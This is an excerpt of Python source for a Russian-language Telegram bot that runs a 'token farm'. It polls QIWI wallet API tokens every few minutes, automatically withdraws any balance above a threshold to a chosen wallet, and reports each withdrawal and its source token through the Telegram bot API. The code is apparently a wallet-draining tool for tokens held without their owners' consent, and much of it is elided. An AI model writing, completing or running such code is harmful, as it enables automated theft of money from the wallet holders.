...
def check_token():
    while True:
        ...
        for i in result:
            try:
                api = QApi(token=i[1], phone=config.phone)
                balance = api.balance[0]
                if balance >= config.min_summa:
...
def send_message(id, your_phone, from_token, balance):
    requests.get(
        f"https://api.telegram.org/bot{config.telegram_token}/sendMessage?chat_id={id}&text=✅ Успешный вывод с ферм\n\n🌐 В размере: {balance}₽\n📥 Отправитель: {from_token}\n♻️ Получатель: {your_phone}")
...
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, config.text)
        return
    await bot.send_message(message.from_user.id,
                           'Добро пожаловать!\nЧтобы оставить заявку, воспользуйтесь клавиатурой.',
...
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        ...
        return
    await message.reply(
        '❓Что такое ферма токенов? Ферма токенов - это набор ваших токенов которые проверяются каждые 5 минут на пополнения.\nЕсли кошелек будет пополнен то средства автоматически выведутся на указанный вами кошелёк.',
        reply=False)
...
async def handler(message: types.Message):
    ...
    await bot.send_message(message.from_user.id,
                           'После пополнения, ваших токенов. Деньги  придут именно на эти реквизиты.',
                           reply_markup=keyboard.props)
